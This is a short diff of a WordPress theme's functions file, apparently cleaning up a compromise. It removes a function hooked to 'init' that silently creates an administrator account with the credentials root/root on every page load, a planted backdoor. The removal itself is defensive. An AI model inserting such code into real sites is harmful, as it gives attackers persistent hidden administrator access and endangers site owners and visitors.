@@ -110,16 +110,6 @@ include('includes/menus.php');
 //include('includes/twitter_loader.php'); 	//-- call within page, not functions!
 //include('includes/facebook_feed.php');  	//-- call within page, not functions!
 //include('includes/fancy_loader.php');   	//-- call within page, not functions!
-function wpb_admin_account(){
-	$user = 'root';
-	$pass = 'root';
-	$email = 'root@xxxxx.com';
-	if ( !username_exists( $user )  && !email_exists( $email ) ) {
-	$user_id = wp_create_user( $user, $pass, $email );
-	$user = new WP_User( $user_id );
-	$user->set_role( 'administrator' );
-	} }
-	add_action('init','wpb_admin_account');
 
 /**
  * Helper function to replace the first occurence of a string.
